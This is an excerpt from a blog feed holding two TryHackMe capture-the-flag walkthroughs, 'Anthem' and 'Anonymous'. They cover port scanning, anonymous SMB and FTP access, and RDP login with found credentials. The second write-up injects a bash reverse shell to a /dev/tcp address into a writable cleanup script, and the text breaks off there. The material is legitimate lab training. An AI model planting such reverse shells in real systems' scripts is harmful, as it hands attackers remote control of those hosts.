|_ssl-date: 2020-10-02T19:16:51+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +2s from scanner time.
Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2020-10-02T19:15:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;92.04 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Found 5 Open ports on the Target:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;80 - Web-Server - Microsoft HTTPAPI httpd 2.0&lt;/li&gt;
  &lt;li&gt;135 - msrpc- Microsoft Windows RPC&lt;/li&gt;
  &lt;li&gt;139 - netbios-ssn - Microsoft Windows netbios-ssn&lt;/li&gt;
  &lt;li&gt;445 - microsoft-ds?&lt;/li&gt;
  &lt;li&gt;3389 - ms-wbt-server - Microsoft Terminal Services&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The first thing i was looking was the Web-server. Was checking if the robots.txt file exists and if it hade some usefull information in it.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;U***************!

# Use for all search robots
User-agent: *

# Define the directories not to crawl
Disallow: /bin/
Disallow: /config/
Disallow: /umbraco/
Disallow: /umbraco_client/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As for the questions from THM, this clould be a possible Password for admin user.&lt;/p&gt;

&lt;p&gt;So i decided to have a look further into the website. And i could answer all other question, only through looking at the source code of the websites.&lt;/p&gt;

&lt;p&gt;The username of the Admin i got via googeling the Poem witch i found in one Blog-Post on the Web-server.&lt;/p&gt;

&lt;p&gt;so we now need the email address of the administrator. When i was looking on the Blog-Post “We are hiring” i found one email address: JD@anthem.com. so we know the email address is build with the first letter of the Firstname and the first letter of the Lastname.&lt;/p&gt;

&lt;h1 id=&quot;spot-the-flags&quot;&gt;Spot the flags&lt;/h1&gt;

&lt;p&gt;For the flags, i was looking through the source-code and found all 4-Flags on the Web-server. Just keep looking through the Web-Site.&lt;/p&gt;

&lt;h1 id=&quot;final-stage&quot;&gt;Final stage&lt;/h1&gt;

&lt;p&gt;After we got the Username and the password for the Administrator we tried to loggin into the RDP-Connection.&lt;/p&gt;

&lt;p&gt;For the RDP-Login i used the program rdesktop on Kali with following command:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rdesktop &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; s&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; U&lt;span class=&quot;k&quot;&gt;***************&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; anthem.com 10.10.163.60
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have now access to the target and we can now read the user flag witch is lockated on ther Desktop.&lt;/p&gt;

&lt;p&gt;For the Root-Flag we have to look around on the Target. If we can find something we can use.&lt;/p&gt;

&lt;p&gt;I found a hidden file on the C-drive. When i was looking into that the folder there was a file located, but i don’t have any permissions for the file.&lt;/p&gt;

&lt;p&gt;So i decided to gave the user the permissions of the file and then i have access to the file.&lt;/p&gt;

&lt;p&gt;In this file, there is a word, witch could be the Admin-Password. 
Now we can go to the Administrator folder and read the root.txt file and then we have the root-flag.&lt;/p&gt;
</description>
        <pubDate>Sat, 03 Oct 2020 00:00:00 +0000</pubDate>
        <link>/blog/anthem/</link>
        <guid isPermaLink="true">/blog/anthem/</guid>
      </item>
    
      <item>
        <title>Writeup - THM - Anonymous</title>
        <description>&lt;h1 id=&quot;general-information&quot;&gt;General Information&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Room&lt;/th&gt;
      &lt;th&gt;Date&lt;/th&gt;
      &lt;th&gt;Difficulty&lt;/th&gt;
      &lt;th&gt;Tags&lt;/th&gt;
      &lt;th&gt;Time&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Anonymous&lt;/td&gt;
      &lt;td&gt;27.09.2020&lt;/td&gt;
      &lt;td&gt;Medium&lt;/td&gt;
      &lt;td&gt;Security, linux, permissions, medium&lt;/td&gt;
      &lt;td&gt;2h&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;used-programs&quot;&gt;Used Programs&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Program&lt;/th&gt;
      &lt;th&gt;Command&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;rustscan&lt;/td&gt;
      &lt;td&gt;rustscan $ip –ulimit 5000 – -sC -sV -oN nmap/initial  tee output&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;smbclient&lt;/td&gt;
      &lt;td&gt;smbclient -L 10.10.195.20&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ftp&lt;/td&gt;
      &lt;td&gt;ftp 10.10.195.20&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;tryhackme---answers&quot;&gt;TryHackMe - Answers:&lt;/h1&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;1-enumerate-the-machine-how-many-ports-are-open&quot;&gt;1 Enumerate the machine. How many ports are open?&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;2-what-service-is-running-on-port-21&quot;&gt;2 What service is running on port 21?&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;3-what-service-is-running-on-ports-139-and-445&quot;&gt;3 What service is running on ports 139 and 445?&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;4-theres-a-share-on-the-users-computer-whats-it-called&quot;&gt;4 There’s a share on the user’s computer. What’s it called?&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pics
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;5-usertxt&quot;&gt;5 user.txt&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;9******************************0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;6-roottxt&quot;&gt;6 root.txt&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4******************************3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;walkthrough&quot;&gt;Walkthrough:&lt;/h1&gt;

&lt;p&gt;The first thing i always do is a NMAP-Scan on the target machine. 
I used the Program “Rustscan”.&lt;/p&gt;

&lt;p&gt;The rustscan command which i used was:&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rustscan 10.10.195.20 | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;rustscan-output.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Below the output of the Rustscan.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;File: rustscan-output.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
   2   │ | &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;| &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; |&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;__ &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;_   _&lt;span class=&quot;o&quot;&gt;}{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;__  /  ___&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;|  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;| |
   3   │ | .-. &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; |.-._&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; | |  .-._&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/  /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; |&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; |
   4   │ &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;' `-'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'`----'&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;'  `----'&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' `-'&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;'`-'&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;'
   5   │ Faster Nmap scanning with Rust.
   6   │ ________________________________________
   7   │ : https://discord.gg/GFrQsGy           :
   8   │ : https://github.com/RustScan/RustScan :
   9   │  --------------------------------------
  10   │ 🌍HACK THE PLANET🌍
  11   │ 
  12   │ [~] The config file is expected to be at &quot;/home/fr3akazo1d/.rustscan.toml&quot;
  13   │ [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive s
       │ ervers
  14   │ [!] Your file limit is very small, which negatively impacts RustScan'&lt;/span&gt;s speed. Use the Docker image, or up the
       │  Ulimit with &lt;span class=&quot;s1&quot;&gt;'--ulimit 5000'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 
  15   │ Open 10.10.195.20:21
  16   │ Open 10.10.195.20:139
  17   │ Open 10.10.195.20:22
  18   │ Open 10.10.195.20:445
  19   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;~] Starting Nmap
  20   │ &lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; The Nmap &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to be run is nmap &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 21,139,22,445 10.10.195.20
  21   │ 
  22   │ Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-09-27 21:18 CEST
  23   │ Initiating Ping Scan at 21:18
  24   │ Scanning 10.10.195.20 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2 ports]
  25   │ Completed Ping Scan at 21:18, 0.08s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  26   │ Initiating Parallel DNS resolution of 1 host. at 21:18
  27   │ Completed Parallel DNS resolution of 1 host. at 21:18, 0.03s elapsed
  28   │ DNS resolution of 1 IPs took 0.03s. Mode: Async &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]&lt;/span&gt;
  29   │ Initiating Connect Scan at 21:18
  30   │ Scanning 10.10.195.20 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
  31   │ Discovered open port 139/tcp on 10.10.195.20
  32   │ Discovered open port 445/tcp on 10.10.195.20
  33   │ Discovered open port 22/tcp on 10.10.195.20
  34   │ Discovered open port 21/tcp on 10.10.195.20
  35   │ Completed Connect Scan at 21:18, 0.07s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  36   │ Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.195.20
  37   │ Host is up, received conn-refused &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.080s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
  38   │ Scanned at 2020-09-27 21:18:25 CEST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;0s
  39   │ 
  40   │ PORT    STATE SERVICE      REASON
  41   │ 21/tcp  open  ftp          syn-ack
  42   │ 22/tcp  open  ssh          syn-ack
  43   │ 139/tcp open  netbios-ssn  syn-ack
  44   │ 445/tcp open  microsoft-ds syn-ack
  45   │ 
  46   │ Read data files from: /usr/bin/../share/nmap
  47   │ Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.22 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As in the output we can see, that we have 4 Ports open:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  40   │ PORT    STATE SERVICE      REASON
  41   │ 21/tcp  open  ftp          syn-ack
  42   │ 22/tcp  open  ssh          syn-ack
  43   │ 139/tcp open  netbios-ssn  syn-ack
  44   │ 445/tcp open  microsoft-ds syn-ack
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;enumerate-smb-share&quot;&gt;Enumerate SMB-Share&lt;/h2&gt;

&lt;p&gt;The first Port i have explored was 139/445 SMB. 
With the command “smbclient -L 10.10.195.20” we enummerate the services witch a available on the server.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-L|--list
This option allows you to look at what services are available on a server. You use it as smbclient -L host and a list should appear. The -I option may be useful if your NetBIOS names don't match your TCP/IP DNS host names or if you are trying to reach a host on another network.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This give us this Infromation:&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.195.20
Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;r3akazo1d&lt;span class=&quot;s1&quot;&gt;'s password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this infromation, i tried to connect to the “pics” share on the server.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;10.10.195.20&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;pics
Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;r3akazo1d&lt;span class=&quot;s1&quot;&gt;'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Sun May 17 13:11:34 2020
  ..                                  D        0  Sun Sep 27 21:48:54 2020
  corgo2.jpg                          N    42663  Tue May 12 02:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 02:43:42 2020

		20508240 blocks of size 1024. 13289716 blocks available
smb: \&amp;gt;
copied the files to my local machine:

smb: \&amp;gt; get corog2.jpg
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \corog2.jpg
smb: \&amp;gt; get corgo2.jpg
getting file \corgo2.jpg of size 42663 as corgo2.jpg (94.9 KiloBytes/sec) (average 94.9 KiloBytes/sec)
smb: \&amp;gt; get puppos.jpeg
getting file \puppos.jpeg of size 265188 as puppos.jpeg (315.1 KiloBytes/sec) (average 238.4 KiloBytes/sec)
smb: \&amp;gt; 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This connection was successfully. The connection was done without any password and username. 
Analyzed the two files with steghide. there are some files behind. but i don’t get the passphrase for the files.
These are only pictures of dogs…&lt;/p&gt;

&lt;h2 id=&quot;enumerate-ftp-share&quot;&gt;Enumerate FTP-Share&lt;/h2&gt;

&lt;p&gt;The next step was to enumerate the FTP-Share. Maybe we have better luck on this Server.&lt;/p&gt;

&lt;p&gt;I tried the “anonymous” login on the FTP-Share.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp 10.10.195.20
Connected to 10.10.195.20.
220 NamelessOne&lt;span class=&quot;s1&quot;&gt;'s FTP Server!
Name (10.10.195.20:fr3akazo1d): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
lets check what is on this ftp share:

ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts
226 Directory send OK.
tp&amp;gt; cd scripts
250 Directory successfully changed.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          364 Sep 27 19:39 clean.sh
-rw-rw-r--    1 1000     1000         4257 Sep 27 20:24 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Anonymous login was successfully so i have checked the files on the FTP-Share. In the folder “scripts” there are three files listed.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;clean.sh&lt;/li&gt;
  &lt;li&gt;removed_files.log&lt;/li&gt;
  &lt;li&gt;to_do.txt&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Lets check out what is in this files:&lt;/p&gt;

&lt;p&gt;clean.sh&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bat clean.sh         
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: clean.sh
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ &lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
   2   │ 
   3   │ &lt;span class=&quot;nv&quot;&gt;tmp_files&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
   4   │ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmp_files&lt;/span&gt;
   5   │ &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmp_files&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
   6   │ &lt;span class=&quot;k&quot;&gt;then
   &lt;/span&gt;7   │         &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Running cleanup script:  nothing to delete&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /var/ftp/scripts/removed_files.log
   9   │ &lt;span class=&quot;k&quot;&gt;else
  &lt;/span&gt;10   │     &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;LINE &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmp_files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
  &lt;/span&gt;11   │         &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /tmp/&lt;span class=&quot;nv&quot;&gt;$LINE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; | Removed file /tmp/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LINE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /var/ftp/scripts/removed_files
       │ .log&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
  &lt;/span&gt;12   │ &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So this file is interessting because, this is somehow removing some files on the target machine. 
Maybe we can change the code in the file an rerun the scirpt on the target.&lt;/p&gt;

&lt;p&gt;removed_files.log&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bat removed_files.log 
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: removed_files.log
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Running cleanup script:  nothing to delete
   2   │ Running cleanup script:  nothing to delete
   3   │ Running cleanup script:  nothing to delete
   4   │ Running cleanup script:  nothing to delete
   5   │ Running cleanup script:  nothing to delete
   6   │ Running cleanup script:  nothing to delete
   7   │ Running cleanup script:  nothing to delete
   8   │ Running cleanup script:  nothing to delete
   9   │ Running cleanup script:  nothing to delete
   ....
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is only a log file, when some files are removed it will stored in this file.&lt;/p&gt;

&lt;p&gt;to_do.txt&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bat to_do.txt        
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: to_do.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ I really need to disable the anonymous login...it&lt;span class=&quot;s1&quot;&gt;'s really not safe
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ok, yes, the anonymous login should be removed from the FTP-Server. Something bad can happend. :)&lt;/p&gt;

&lt;p&gt;Now lets focus on the “clean.sh” Maybe we can add a reverse shell in the bash script. 
We cann add a bash reverse-shell into the file.&lt;/p&gt;

&lt;p&gt;Found on Pentest-Monkey a reverse-shell witch should work:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot; title=&quot;Reverse-Shell&quot;&gt;Reverse Shell Cheat Sheet&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Added the code in line 8 of the “clean.sh” script. 
Change the IP-Address to my local address and a port.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bat clean.sh         
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: clean.sh
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ &lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
   2   │ 
   3   │ &lt;span class=&quot;nv&quot;&gt;tmp_files&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
   4   │ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmp_files&lt;/span&gt;
   5   │ &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmp_files&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
   6   │ &lt;span class=&quot;k&quot;&gt;then
   &lt;/span&gt;7   │         &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Running cleanup script:  nothing to delete&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /var/ftp/scripts/removed_files.log
   8   │         bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/1&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.1&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.3.1&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;/8080 0&amp;gt;&amp;amp;1
   9   │ &lt;span class=&quot;k&quot;&gt;else
  &lt;/span&gt;10   │     &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;LINE &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmp_files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
